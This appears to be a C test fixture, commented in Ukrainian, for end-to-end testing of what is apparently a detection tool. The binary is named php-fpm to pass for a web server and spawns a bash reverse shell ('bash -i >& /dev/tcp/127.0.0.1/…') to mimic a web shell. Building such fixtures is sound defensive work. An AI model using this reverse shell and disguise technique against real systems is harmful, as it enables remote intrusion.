/*
 * Фальшивий «веб-сервер» для e2e: бінарник збирається під іменем php-fpm,
 * тому comm процесу — "php-fpm". Запускає bash із reverse shell на
 * 127.0.0.1:<порт> — саме те, що робить веб-шелл у демо.
 *
 *   .output/e2e/php-fpm [порт]
 */
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(int argc, char **argv)
{
	const char *port = argc > 1 ? argv[1] : "4444";
	char cmd[128];
	int status;
	pid_t pid;

	snprintf(cmd, sizeof(cmd), "bash -i >& /dev/tcp/127.0.0.1/%s 0>&1", port);

	pid = fork();
	if (pid < 0) {
		perror("fork");
		return 1;
	}
	if (pid == 0) {
		execlp("bash", "bash", "-c", cmd, (char *)NULL);
		perror("execlp");
		_exit(127);
	}

	if (waitpid(pid, &status, 0) < 0) {
		perror("waitpid");
		return 1;
	}
	if (WIFSIGNALED(status))
		printf("bash убито сигналом %d\n", WTERMSIG(status));
	else
		printf("bash завершився з кодом %d\n", WEXITSTATUS(status));
	return 0;
}
